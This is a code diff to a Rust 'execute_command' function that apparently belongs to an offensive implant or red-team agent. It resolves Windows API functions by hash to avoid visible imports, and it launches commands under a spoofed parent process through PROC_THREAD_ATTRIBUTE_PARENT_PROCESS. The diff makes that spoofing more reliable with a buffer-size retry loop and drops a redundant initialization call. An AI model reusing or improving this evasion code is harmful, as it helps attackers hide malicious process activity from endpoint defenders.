@@ -48,6 +48,15 @@ pub fn execute_command(
     ) -> i32; // BOOL
     let update_attr: UpdateProcThreadAttrFn = std::mem::transmute(update_attr_addr);
 
+    // GetLastError – needed to distinguish ERROR_INSUFFICIENT_BUFFER from real failures.
+    let get_last_error_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"GetLastError\0"),
+    ).ok_or_else(|| anyhow::anyhow!("could not resolve GetLastError"))?;
+    type GetLastErrorFn = unsafe extern "system" fn() -> u32;
+    let get_last_error: GetLastErrorFn = std::mem::transmute(get_last_error_addr);
+    const ERROR_INSUFFICIENT_BUFFER: u32 = 122;
+
     // DeleteProcThreadAttributeList
     let delete_attr_addr = pe_resolve::get_proc_address_by_hash(
         k32,
@@ -128,36 +137,56 @@ pub fn execute_command(
         }
         let mut p_handle: HANDLE = if p_handle_raw != 0 { p_handle_raw as *mut _ } else { std::ptr::null_mut() };
 
-        let mut size = 0;
+        let mut size: usize = 0;
+        // First call to get required size (returns FALSE and sets size).
         init_attr_list(std::ptr::null_mut(), 1, 0, &mut size);
-        // InitializeProcThreadAttributeList may leave `size = 0` on failure
-        // (e.g. invalid parameters), which would make the subsequent
-        // `vec![0u8; 0]` allocation produce a dangling pointer that the second
-        // call would then write through.  Fall back to a reasonable default
-        // (H-7).
         if size == 0 {
-            size = 1024;
+            size = 512; // Starting fallback size
         }
-        let mut attr_list_buf = vec![0u8; size];
+        let mut attr_list_buf;
+        loop {
+            attr_list_buf = vec![0u8; size];
+            let result = init_attr_list(
+                attr_list_buf.as_mut_ptr() as *mut _,
+                1,
+                0,
+                &mut size,
+            );
+            if result != 0 {
+                break; // Success
+            }
+            let err = get_last_error();
+            if err != ERROR_INSUFFICIENT_BUFFER {
+                return Err(anyhow::anyhow!(
+                    "InitializeProcThreadAttributeList failed: error {}",
+                    err
+                ));
+            }
+            // `size` has been updated with the required size; retry.
+            if size > 65536 {
+                return Err(anyhow::anyhow!(
+                    "PROC_THREAD_ATTRIBUTE_LIST too large ({})",
+                    size
+                ));
+            }
+        }
         let attr_list = attr_list_buf.as_mut_ptr() as *mut _;
 
         let mut si: STARTUPINFOEXW = std::mem::zeroed();
         si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
 
         if p_handle.is_null() == false {
-            if init_attr_list(attr_list, 1, 0, &mut size) != 0 {
-                let success = update_attr(
-                    attr_list,
-                    0,
-                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-                    &mut p_handle as *mut _ as *mut _,
-                    std::mem::size_of::<HANDLE>(),
-                    std::ptr::null_mut(),
-                    std::ptr::null_mut(),
-                );
-                if success != 0 {
-                    si.lpAttributeList = attr_list;
-                }
+            let success = update_attr(
+                attr_list,
+                0,
+                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                &mut p_handle as *mut _ as *mut _,
+                std::mem::size_of::<HANDLE>(),
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+            );
+            if success != 0 {
+                si.lpAttributeList = attr_list;
             }
         }
 
